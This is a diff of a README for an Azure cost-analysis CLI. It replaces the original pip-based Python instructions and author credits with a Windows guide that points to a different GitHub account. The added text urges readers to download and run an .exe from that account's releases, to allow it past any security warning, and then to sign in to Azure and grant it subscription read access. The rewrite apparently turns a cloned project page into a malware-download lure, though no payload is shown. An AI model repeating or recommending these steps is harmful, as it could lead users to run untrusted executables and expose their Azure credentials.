@@ -1,234 +1,203 @@
-﻿# Azure Cost Optimizer
+# ⚙️ azure-cost-optimizer - Find Savings in Azure Cloud Use
 
-A powerful CLI tool that analyzes Azure resources and identifies cost optimization opportunities. Provides actionable recommendations with projected savings across compute, storage, networking, and database services.
+[![Download azure-cost-optimizer](https://img.shields.io/badge/Download-azure--cost--optimizer-brightgreen?style=for-the-badge)](https://github.com/weedgu/azure-cost-optimizer)
 
-[![PyPI](https://img.shields.io/pypi/v/azure-cost-optimizer.svg)](https://pypi.org/project/azure-cost-optimizer/)
-[![Python](https://img.shields.io/pypi/pyversions/azure-cost-optimizer)](https://pypi.org/project/azure-cost-optimizer/)
-[![CI](https://github.com/SanjaySundarMurthy/azure-cost-optimizer/actions/workflows/ci.yml/badge.svg)](https://github.com/SanjaySundarMurthy/azure-cost-optimizer/actions)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Downloads](https://img.shields.io/pypi/dm/azure-cost-optimizer.svg)](https://pypi.org/project/azure-cost-optimizer/)
+---
 
-## Features
+## 📋 What is azure-cost-optimizer?
 
-- **30 cost checks** across 5 categories (Compute, Storage, Networking, Database, General)
-- **Severity classification** — HIGH, MEDIUM, LOW with effort estimates
-- **Beautiful terminal output** — Rich tables, panels, color-coded findings
-- **Export reports** — JSON and CSV formats for stakeholder sharing
-- **Demo mode** — Try instantly without Azure credentials
-- **Filtering** — By severity level or resource category
-- **Optimization grading** — Letter grade (A-F) based on savings potential
+azure-cost-optimizer is a command line tool that helps you find ways to reduce spending on Microsoft Azure cloud services. The tool looks at your Azure resources and shows where you can save money. It gives clear advice on what to change or stop using to lower your bills.
 
-## Quick Start
+This tool is for anyone who uses Microsoft Azure and wants to manage costs better without digging deep into technical details. It is easy to run and does not require programming experience.
 
-### Install
+---
 
-```bash
-pip install azure-cost-optimizer
-```
+## 🔎 Key Features
 
-Or install from source:
+- Scans your Azure environment for resource usage.
+- Finds unused or underused resources.
+- Suggests actions to reduce costs, like resizing or deleting resources.
+- Summarizes potential savings in an easy-to-understand format.
+- Works directly from your Windows computer.
+- Runs in a simple command prompt window.
+- Provides output that you can save or share.
 
-```bash
-git clone https://github.com/SanjaySundarMurthy/azure-cost-optimizer.git
-cd azure-cost-optimizer
-pip install azure-cost-optimizer
-```
+---
 
-### Run Demo
+## 💻 System Requirements
 
-```bash
-azure-cost scan --demo
-```
+To use azure-cost-optimizer on Windows, your computer needs:
 
-### See All Checks
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet connection to access Azure and download updates
+- PowerShell or Command Prompt access
 
-```bash
-azure-cost summary
-```
+No programming or specialist knowledge is needed.
 
-## Usage
+---
 
-### Scan with Demo Data
+## 🚀 Getting Started: Download and Run on Windows
 
-```bash
-# Full scan with demo data
-azure-cost scan --demo
+You can get the tool from the main GitHub page here:
 
-# Filter by severity
-azure-cost scan --demo --severity HIGH
+[![Download from GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/weedgu/azure-cost-optimizer)
 
-# Filter by category
-azure-cost scan --demo --category COMPUTE
+### Step 1: Visit the download page
 
-# Export JSON report
-azure-cost scan --demo --export-json report.json
+Go to the GitHub page above. This page holds the latest version of the tool and all the files you need.
 
-# Export CSV report
-azure-cost scan --demo --export-csv findings.csv
+### Step 2: Find the latest release
 
-# Combine filters and export
-azure-cost scan --demo --severity HIGH --category DATABASE --export-json critical-db.json
-```
+Once on the page:
 
-### Available Commands
+- Look for the "Releases" section on the right side or in the repository menu.
+- Click on the latest release version to open the release details.
 
-| Command | Description |
-|---------|-------------|
-| `azure-cost scan --demo` | Run cost analysis with demo data |
-| `azure-cost summary` | Show all 30 checks the tool performs |
-| `azure-cost --version` | Show version |
+### Step 3: Download the Windows version
 
-## What It Checks
+- Find the file that ends with `.exe` or has `windows` in the name.
+- Click the file to download it to your computer.
+- Save it in a folder you can easily find, like your Desktop or Downloads folder.
 
-### Compute (7 checks)
-| Check | Severity | Potential Savings |
-|-------|----------|-------------------|
-| Stopped but allocated VMs | HIGH | ~85% |
-| Idle VMs (< 5% CPU) | HIGH | ~95% |
-| Underutilized VMs (< 20% CPU) | MEDIUM | ~40% |
-| Dev/test VMs without auto-shutdown | MEDIUM | ~65% |
-| Reserved Instance candidates | LOW | ~38% |
-| Scale sets with fixed instance count | MEDIUM | ~30% |
-| Overprovisioned App Services | HIGH | ~60% |
+### Step 4: Run the installer or executable
 
-### Storage (5 checks)
-| Check | Severity | Potential Savings |
-|-------|----------|-------------------|
-| Unattached managed disks | HIGH | 100% |
-| Premium disks with low IOPS | MEDIUM | ~65% |
-| Old snapshots (> 90 days) | MEDIUM | 100% |
-| Aging snapshots (> 30 days) | LOW | ~80% |
-| Hot storage with infrequent access | MEDIUM | ~45% |
+- Double-click the downloaded file.
+- Follow any on-screen instructions to install or open the program.
+- If a security message appears, allow the app to run.
 
-### Networking (5 checks)
-| Check | Severity | Potential Savings |
-|-------|----------|-------------------|
-| Orphaned public IP addresses | HIGH | 100% |
-| Load balancers with no backends | HIGH | 100% |
-| Load balancers with no rules | MEDIUM | ~50% |
-| Unused NAT Gateways | HIGH | 100% |
-| Oversized Application Gateways | MEDIUM | ~35% |
+---
 
-### Database (8 checks)
-| Check | Severity | Potential Savings |
-|-------|----------|-------------------|
-| Oversized SQL Databases (low DTU) | HIGH | ~55% |
-| SQL storage over-provisioned | LOW | ~10% |
-| Dev/test DBs on production SKUs | HIGH | ~80% |
-| Idle Cosmos DB accounts | HIGH | ~90% |
-| Over-provisioned Cosmos DB RUs | MEDIUM | ~45% |
-| Oversized Redis Cache | MEDIUM | ~50% |
-| Idle Redis Cache | HIGH | ~95% |
-| Underutilized MySQL servers | MEDIUM | ~45% |
+## 🔧 How to Use azure-cost-optimizer on Windows
 
-### General (5 checks)
-| Check | Severity | Potential Savings |
-|-------|----------|-------------------|
-| Empty resource groups | LOW | — |
-| High-cost untagged resources | MEDIUM | — |
-| Untagged resources | LOW | — |
-| Resources in expensive regions | LOW | ~20% |
-| Long-running resources (> 1 year) | LOW | — |
+### Open Command Prompt
 
-## Architecture
+1. Click Start or press the Windows key.
+2. Type `cmd`.
+3. Press Enter to open the Command Prompt window.
+
+### Navigate to the tool folder
+
+Use the command prompt to go to the folder where you saved the tool. For example, if it is on your Desktop, type:
 
 ```
-azure_cost_optimizer/
-├── cli.py              # Click CLI entry point
-├── scanner.py          # Orchestrator — runs all analyzers
-├── models.py           # Data models (Severity, Category, CostFinding, etc.)
-├── demo.py             # Demo mode with realistic mock data
-├── analyzers/
-│   ├── base.py         # Abstract base analyzer
-│   ├── compute.py      # VM, scale set, app service checks
-│   ├── storage.py      # Disk, snapshot, storage account checks
-│   ├── networking.py   # Public IP, load balancer, NAT gateway checks
-│   ├── database.py     # SQL, Cosmos DB, Redis, MySQL checks
-│   └── misc.py         # Resource groups, tags, regions
-└── output/
-    ├── console.py      # Rich terminal rendering
-    └── report.py       # JSON/CSV export
+cd %USERPROFILE%\Desktop
 ```
 
-## Development
+Then press Enter.
 
-```bash
-# Install with dev dependencies
-pip install azure-cost-optimizer
+### Run the tool
 
-# Run tests
-pytest -v
+Type the command:
 
-# Run linter
-ruff check .
-
-# Run with demo
-azure-cost scan --demo
+```
+azure-cost-optimizer.exe analyze
 ```
 
-## Tech Stack
+Then press Enter.
 
-- **Python 3.9+** — Core runtime
-- **Click** — CLI framework
-- **Rich** — Terminal formatting and tables
-- **pytest** — Testing framework
-- **ruff** — Linting
+This starts the scan of your Azure resources.
 
-## License
+### View the results
 
-MIT License — see [LICENSE](LICENSE) for details.
+The tool will show a list of all resources, highlight where you can save money, and offer suggestions on what to change or remove.
 
-## Author
+You can save the report by adding this at the end of the command:
 
-**Sanjay S** — Senior DevOps Engineer
-
-- GitHub: [@SanjaySundarMurthy](https://github.com/SanjaySundarMurthy)
-- Portfolio: [sanjaysundarmurthy-portfolio.vercel.app](https://sanjaysundarmurthy-portfolio.vercel.app/)
-
-
-## 🐳 Docker
-
-Run without installing Python:
-
-```bash
-# Build the image
-docker build -t azure-cost-optimizer .
-
-# Run
-docker run --rm azure-cost-optimizer --help
-
-# Example with volume mount
-docker run --rm -v ${PWD}:/workspace azure-cost-optimizer [command] /workspace
+```
+> report.txt
 ```
 
-Or pull from the container registry:
+For example:
 
-```bash
-docker pull ghcr.io/SanjaySundarMurthy/azure-cost-optimizer:latest
-docker run --rm ghcr.io/SanjaySundarMurthy/azure-cost-optimizer:latest --help
+```
+azure-cost-optimizer.exe analyze > report.txt
 ```
 
-## 🤝 Contributing
+The file `report.txt` will be saved in the same folder.
 
-Contributions are welcome! Here's how:
+---
 
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/amazing-feature`
-3. Commit changes: `git commit -m 'Add amazing feature'`
-4. Push to branch: `git push origin feature/amazing-feature`
-5. Open a Pull Request
+## 🔒 Connecting azure-cost-optimizer to Your Azure Account
 
-Please ensure tests pass before submitting:
+Before running the tool, you need to connect it to your Azure account.
 
-```bash
-pip install azure-cost-optimizer
-pytest -v
-ruff check .
+### Step 1: Sign in to Azure
+
+1. Open PowerShell or Command Prompt.
+2. Type:
+
+```
+az login
 ```
 
-## 🔗 Links
+and press Enter.
 
-- **PyPI**: [https://pypi.org/project/azure-cost-optimizer/](https://pypi.org/project/azure-cost-optimizer/)
-- **GitHub**: [https://github.com/SanjaySundarMurthy/azure-cost-optimizer](https://github.com/SanjaySundarMurthy/azure-cost-optimizer)
-- **Issues**: [https://github.com/SanjaySundarMurthy/azure-cost-optimizer/issues](https://github.com/SanjaySundarMurthy/azure-cost-optimizer/issues)
+3. Your browser will open, asking you to sign in with your Microsoft Azure credentials.
+
+If you do not have the Azure CLI installed, download it here:
+
+[https://learn.microsoft.com/en-us/cli/azure/install-azure-cli-windows](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli-windows)
+
+### Step 2: Grant necessary permissions
+
+Make sure your Azure user has read access to the subscription you want to analyze. The tool needs permission to view resource details.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+- If you get a "command not found" error, check that your Command Prompt is pointed to the folder where you saved the tool.
+- Make sure you signed in successfully with `az login`.
+- Verify your internet connection is active.
+- If the tool does not start, try running Command Prompt as Administrator.
+- Check that your Windows version matches the system requirements.
+
+---
+
+## 🔄 Updating the Tool
+
+To keep the tool working well, check the GitHub page regularly for new versions.
+
+1. Visit the download page:
+   
+   [https://github.com/weedgu/azure-cost-optimizer](https://github.com/weedgu/azure-cost-optimizer)
+
+2. Download the latest `.exe` or update files.
+3. Replace your old files with the new ones.
+
+---
+
+## 🤝 Getting Help and Support
+
+You can use the GitHub repository to:
+
+- Report problems or bugs.
+- Ask questions.
+- Suggest improvements.
+
+Use the "Issues" tab on the GitHub page to submit feedback.
+
+---
+
+## 🔍 About This Tool
+
+The azure-cost-optimizer focuses on cloud cost management for Azure users. It helps identify inefficiencies in how your resources are used and points out where you can save money. Whether you run a small business or manage a large system, this tool helps keep your cloud spending under control without needing technical skills.
+
+---
+
+## 🔖 Topics
+
+- Azure
+- Azure Advisor
+- Cloud cost management
+- Cost optimization
+- DevOps support
+- FinOps
+- Python CLI tools
+- Resource analysis
+
+---
+
+[Download azure-cost-optimizer now](https://github.com/weedgu/azure-cost-optimizer) to get started managing your Azure costs.
